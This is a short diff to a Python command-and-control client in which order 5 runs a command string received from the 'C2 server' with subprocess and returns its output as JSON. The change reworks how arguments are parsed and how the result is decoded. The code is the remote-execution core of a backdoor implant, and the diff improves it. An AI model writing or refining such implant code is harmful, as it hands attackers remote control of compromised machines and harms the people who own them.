@@ -55,19 +55,14 @@ def execute_order(order, additional_data_received = ""):
 
   elif order == str(5):
     try:
-      additional_data_received = additional_data_received
-      list_arguments = additional_data_received.split("-")
-      list_arguments_2 = [list_arguments[0].strip()]
-      for _ in list_arguments[1:]:
-        list_arguments_2.append(f"-{_.strip()}")
-
-      result_command = subprocess.check_output(list_arguments_2)
+      list_arguments = additional_data_received.strip().split()
+      result_command = subprocess.run(list_arguments, capture_output=True, check=True).stdout
       print("Result command : ", result_command)
     except Exception as e:
       print("Error while executing the command of the C2 server : ", e)
       return ""
 
-    return json.dumps({additional_data_received:result_command.decode()})
+    return json.dumps({additional_data_received:result_command.decode("ISO-8859-1")})
 
   else:
     return ""
